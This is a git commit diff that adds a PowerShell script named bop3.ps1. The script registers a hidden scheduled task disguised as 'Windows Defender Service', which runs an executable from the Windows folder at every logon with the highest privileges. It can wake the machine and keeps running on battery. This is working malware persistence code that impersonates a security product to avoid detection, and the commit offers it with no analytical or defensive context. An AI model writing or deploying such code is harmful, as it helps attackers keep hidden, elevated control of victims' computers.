21b767e887afb97b79f59f82c616d70958bb2ab8
BobbyTech01 <71655475+BobbyTech01@users.noreply.github.com>
2025-03-26 13:49:28 -0700

    Update bop3.ps1

--- bop3.ps1
+++ bop3.ps1
@@ -1,1 +1,33 @@
+$TaskName = "Windows Defender Service" # Changed task name
+$ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path
 
+$Action = New-ScheduledTaskAction -Execute $ExePath
+
+# Trigger at log on of any user
+$LogonTrigger = New-ScheduledTaskTrigger -AtLogOn
+
+$Trigger = $LogonTrigger
+
+$Settings = New-ScheduledTaskSettingsSet -Hidden -WakeToRun
+
+# Use the current user's credentials
+$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
+
+# Create the scheduled task
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force
+
+# Get the scheduled task object
+$Task = Get-ScheduledTask -TaskName $TaskName
+
+# Disable the "Start the task only if the computer is on AC power" condition
+$Task.Settings.DisallowStartIfOnBatteries = $false
+
+# Set the task to hidden
+$Task.Settings.Hidden = $true
+
+# Stop if the computer ceases to be idle
+$Task.Settings.StopIfGoingOnBatteries = $false
+#$Task.Settings.StopIfIdleEnd = $true # removed because of idle trigger removal.
+
+# Update the task using the -InputObject parameter
+Set-ScheduledTask -InputObject $Task
